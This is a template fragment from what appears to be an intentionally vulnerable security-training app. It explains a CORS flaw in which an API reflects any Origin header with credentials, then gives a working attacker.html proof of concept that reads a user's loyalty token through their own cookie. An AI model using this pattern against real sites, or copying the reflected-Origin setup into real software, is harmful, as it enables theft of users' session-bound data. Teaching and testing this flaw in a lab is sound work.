/a05/api/loyalty-status returns your loyalty-program token as JSON, and it's meant to be read only by this site's own frontend. Instead, its CORS headers reflect whatever Origin the request came from, verbatim, and mark the response as credentialed — which means any other website's JavaScript, running in your browser, can fetch it too and read your token using your own cookie.

{% endblock %} {% block detect %}

Visiting this page sets a cookie holding your loyalty token. A properly configured API would only ever send Access-Control-Allow-Origin for origins on an explicit allowlist. Here, request the API with any Origin header at all and watch the response headers reflect it back exactly.

{% endblock %} {% block exploitation %}

A literal Access-Control-Allow-Origin: * combined with credentials is something real browsers refuse outright — that combination is blocked by the Fetch spec. The bug here is the more common, subtler variant: instead of a hardcoded wildcard, the server reflects whatever Origin the request claims, which passes the browser's own check for every single origin, including an attacker's.

Save this as attacker.html and open it from any different origin (a different port on the same host is not enough — try serving it via python3 -m http.server from a different hostname, e.g. open it as http://localhost:8000/attacker.html while this app runs on 127.0.0.1):

<!doctype html>
<html><body>
<div id="result">pending</div>
<script>
fetch('http://127.0.0.1:5001/a05/api/loyalty-status', {credentials: 'include'})
  .then(r => r.json())
  .then(j => document.getElementById('result').textContent = 'STOLEN: ' + JSON.stringify(j))
  .catch(e => document.getElementById('result').textContent = 'blocked: ' + e);
</script>
</body></html>

If you've already visited this example page in the same browser (so the loyalty-token cookie is set), the attacker page reads your real token — using your browser's own cookie, without ever needing to steal it directly.
